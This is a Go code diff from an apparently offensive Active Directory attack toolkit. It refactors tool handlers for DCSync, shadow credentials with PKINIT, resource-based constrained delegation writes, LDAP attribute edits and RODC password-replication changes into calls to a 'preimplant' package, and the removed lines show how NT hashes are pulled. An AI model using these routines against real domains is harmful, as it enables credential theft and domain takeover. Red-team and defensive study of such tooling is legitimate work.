@@ -7,11 +7,9 @@ import (
 	"strings"
 
 	"github.com/KKingZero/ARK/pkg/arkhome"
-	"github.com/KKingZero/ARK/pkg/drs"
 	"github.com/KKingZero/ARK/pkg/krb"
 	"github.com/KKingZero/ARK/pkg/ldapcli"
 	"github.com/KKingZero/ARK/pkg/preimplant"
-	"github.com/KKingZero/ARK/pkg/smbcli"
 )
 
 func hostTool(name, desc, risk string) ToolDef {
@@ -109,12 +107,6 @@ func hostLDAPSet(args map[string]any) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
 	target := str(args, "target")
 	attr := str(args, "attr")
 	value := str(args, "value")
@@ -124,8 +116,7 @@ func hostLDAPSet(args map[string]any) (string, error) {
 	if value == "" && !boolArg(args, "force") {
 		return "", fmt.Errorf("empty value would clear %s on %s; pass force=true", attr, target)
 	}
-	base := ldapcli.BaseDN(opts.Domain)
-	if err := ldapcli.SetAttr(conn, base, target, attr, value); err != nil {
+	if err := preimplant.LDAPSet(opts, target, attr, value); err != nil {
 		return "", err
 	}
 	return fmt.Sprintf("OK ldap set %s on %s", attr, target), nil
@@ -187,24 +178,17 @@ func hostRBCD(args map[string]any, write bool) (string, error) {
 	if to == "" {
 		return "", fmt.Errorf("to required")
 	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
-	base := ldapcli.BaseDN(opts.Domain)
 	if write {
 		if from == "" {
 			return "", fmt.Errorf("from required")
 		}
-		st, err := ldapcli.WriteRBCD(conn, base, to, from)
+		st, err := preimplant.RBCDWrite(opts, to, from)
 		if err != nil {
 			return "", err
 		}
 		return fmt.Sprintf("OK rbcd write --to %s --from %s", st.TargetSAM, from), nil
 	}
-	st, err := ldapcli.ClearRBCD(conn, base, to, from)
+	st, err := preimplant.RBCDClear(opts, to, from)
 	if err != nil {
 		return "", err
 	}
@@ -220,35 +204,7 @@ func hostShadowAuto(args map[string]any) (string, error) {
 	if target == "" {
 		return "", fmt.Errorf("target required")
 	}
-	out := str(args, "out")
-	if out == "" {
-		out = target + ".pfx"
-	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
-	base := ldapcli.BaseDN(opts.Domain)
-	cred, err := ldapcli.GenerateKeyCredential(target)
-	if err != nil {
-		return "", err
-	}
-	if err := ldapcli.WriteKeyCredentialPFX(out, cred.PFX); err != nil {
-		return "", err
-	}
-	st, err := ldapcli.WriteShadow(conn, base, target, cred.Blob)
-	if err != nil {
-		return "", err
-	}
-	res, err := krb.PKINIT(krb.PKINITOptions{
-		Domain: opts.Domain, Username: target, KDC: opts.Host, PFXPath: out,
-	})
-	if err != nil {
-		return fmt.Sprintf("OK shadow auto %s pfx=%s (pkinit: %v)", st.TargetSAM, out, err), nil
-	}
-	return fmt.Sprintf("OK shadow auto %s pfx=%s NT %s", st.TargetSAM, out, res.NTHash), nil
+	return preimplant.ShadowAuto(opts, target, str(args, "out"))
 }
 
 func hostShadowClear(args map[string]any) (string, error) {
@@ -260,17 +216,7 @@ func hostShadowClear(args map[string]any) (string, error) {
 	if target == "" {
 		return "", fmt.Errorf("target required")
 	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
-	st, err := ldapcli.ClearShadow(conn, ldapcli.BaseDN(opts.Domain), target)
-	if err != nil {
-		return "", err
-	}
-	return fmt.Sprintf("OK shadow clear %s", st.TargetSAM), nil
+	return preimplant.ShadowClear(opts, target)
 }
 
 func hostDCSync(args map[string]any) (string, error) {
@@ -282,39 +228,7 @@ func hostDCSync(args map[string]any) (string, error) {
 	if target == "" {
 		return "", fmt.Errorf("target required")
 	}
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	e, err := ldapcli.LookupSAM(conn, ldapcli.BaseDN(opts.Domain), target)
-	conn.Close()
-	if err != nil {
-		return "", err
-	}
-	ticket := str(args, "ticket_id")
-	if ticket == "" {
-		if opts.Password == "" {
-			return "", fmt.Errorf("dcsync needs pass_file (asktgt) or ticket_id")
-		}
-		m, err := krb.AskTGT(krb.AskTGTOptions{
-			Domain: opts.Domain, Username: opts.Username, Password: opts.Password, KDC: opts.Host,
-		})
-		if err != nil {
-			return "", err
-		}
-		ticket = m.CCache
-	}
-	s, err := smbcli.DialKerberos(smbcli.Options{Host: opts.Host, Domain: opts.Domain, Ticket: ticket})
-	if err != nil {
-		return "", err
-	}
-	defer s.Close()
-	res, err := drs.ReplicateObject(s, e.DN)
-	if err != nil {
-		return "", err
-	}
-	res.SAM = e.GetAttributeValue("sAMAccountName")
-	return fmt.Sprintf("OK dcsync sam=%s nt=%s", res.SAM, res.NTHash), nil
+	return preimplant.DCSync(opts, target, str(args, "ticket_id"))
 }
 
 func hostAskTGT(args map[string]any) (string, error) {
@@ -400,17 +314,7 @@ func hostPRPClear(args map[string]any) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
-	dn, err := ldapcli.ClearNeverReveal(conn, ldapcli.BaseDN(opts.Domain), str(args, "rodc"))
-	if err != nil {
-		return "", err
-	}
-	return "OK prp clear-never-reveal " + dn, nil
+	return preimplant.PRPClearNeverReveal(opts, str(args, "rodc"))
 }
 
 func hostPRPAdd(args map[string]any) (string, error) {
@@ -418,17 +322,7 @@ func hostPRPAdd(args map[string]any) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	opts.RequireTLS = true
-	conn, err := ldapcli.Bind(opts)
-	if err != nil {
-		return "", err
-	}
-	defer conn.Close()
-	dn, err := ldapcli.AddRevealOnDemand(conn, ldapcli.BaseDN(opts.Domain), str(args, "rodc"), str(args, "group"))
-	if err != nil {
-		return "", err
-	}
-	return "OK prp add-reveal " + dn, nil
+	return preimplant.PRPAddReveal(opts, str(args, "rodc"), str(args, "group"))
 }
 
 func boolArg(args map[string]any, k string) bool {
